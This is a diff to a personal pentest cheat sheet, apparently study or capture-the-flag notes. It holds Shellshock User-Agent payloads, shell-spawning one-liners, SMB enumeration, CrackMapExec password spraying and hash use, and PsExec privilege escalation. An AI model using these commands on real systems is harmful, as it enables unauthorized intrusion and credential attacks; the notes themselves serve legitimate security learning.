@@ -1,3 +1,4 @@
+>Here's where I drop whatever comes to my mind
 
 ### 掃描目錄
 + [dirsearch](https://github.com/maurosoria/dirsearch)
@@ -110,3 +111,72 @@ User-Agent: () { :;}; /usr/bin/python3 -c 'import os;os.system("echo; /bin/ping 
 User-Agent: () { :;}; echo; /usr/bin/python3 -c 'import os; os.system("/bin/ping -c 1 10.10.14.15")'; /usr/bin/id
 ```
 
+### Spawning a TTY Shell
+
+```
+- python -c 'import pty; pty.spawn("/bin/sh")'
+- echo os.system('/bin/bash')
+- /bin/sh -i
+- perl —e 'exec "/bin/sh";'
+- perl: exec "/bin/sh";
+- ruby: exec "/bin/sh"
+- lua: os.execute('/bin/sh')
+- exec "/bin/sh"
+```
+
+### SMB
+[smbclient](https://oldgrayduck.blogspot.com/2021/06/centos7-smbclient-windows.html?m=0)
+
+```
+smb  -L //IP/dir name  -U useraccount
+smbclient -L //<attackerIP>/<folder> --option='client min protocol=NT1'
+
+nmap --script smb-vuln* -p port IP
+
+#Download all
+smbclient //<IP>/<share>
+
+```
+smbmap
+`smbmap -u admin -p password1 -d workgroup -H IP`
+
+enum4linux
+
+```
+enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
+enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
+nmap --script "safe or smb-enum-*" -p 445 <IP>
+```
+
+### [NetBIOS](https://www.kali.org/tools/nbtscan/)
+nbtscan 
+
+### WhoPort
++ 139,445 => SMB
+
+
+### 後滲透利用工具
+[CrackMapExec](https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/)
+```
+# Target format
+crackmapexec smb ms.evilcorp.org
+crackmapexec smb 192.168.1.0 192.168.0.2
+crackmapexec smb 192.168.1.0-28 10.0.0.1-67
+crackmapexec smb 192.168.1.0/24
+crackmapexec smb targets.txt
+
+# Null session
+crackmapexec smb 192.168.10.1 -u "" up ""
+
+# Bruteforcing and Password Spraying
+crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1"
+crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1" "password2"
+crackmapexec smb 192.168.100.0/24 -u "admin1" "admin2" -p "P@ssword"
+crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
+crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
+
+```
+
+### 提權
+PsExec
+`psexec.exe -s -i cmd.exe`
